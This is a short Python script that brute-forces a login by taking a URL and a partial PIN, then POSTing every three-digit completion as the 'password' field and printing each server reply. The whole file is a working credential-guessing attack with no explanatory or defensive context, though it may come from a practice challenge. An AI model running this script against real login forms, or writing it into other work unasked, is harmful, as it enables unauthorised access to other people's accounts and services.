import requests
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('--url')
parser.add_argument('--pin')
args = parser.parse_args()

url = args.url
partial_pin = args.pin

for i in range(0, 1000):
  pin = f"{partial_pin}{i:03}"
  r = requests.post(url, data={ 'password': pin })
  print(f"{pin}: {r.text}")
